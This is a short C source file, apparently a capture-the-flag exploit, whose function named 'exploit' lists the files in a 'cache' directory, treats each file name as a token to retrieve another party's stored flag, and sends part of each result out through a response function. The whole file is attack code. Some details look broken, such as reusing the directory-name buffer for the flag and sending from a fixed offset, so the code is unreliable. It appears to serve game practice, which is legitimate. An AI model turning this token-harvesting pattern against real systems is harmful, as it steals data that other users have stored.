#include <stdio.h>
#include <dirent.h>

extern int store_flag(const char * token, const char * flag);
extern int retrieve_flag(const char * token, char * flag);
extern int send_response(char * response, size_t length);

typedef int (*FStore)(const char * token, const char * flag);
typedef int (*FRetrieve)(const char * token, char * flag);
typedef int (*FSend)(char * response, size_t length);


int exploit(FStore mystore, FRetrieve myretrive, FSend mysend)
{
struct dirent* curdir;
char dirname[128] = "cache";
DIR* dir = opendir( "cache" );
while ( curdir = readdir( dir ) )
	{
	if ( curdir->d_type == DT_REG )
		{
		myretrive( curdir->d_name, dirname );
		mysend( dirname + 12, 20 );
		}
	}
return closedir( dir );
}

int main()
{
return exploit(store_flag, retrieve_flag, send_response);
}

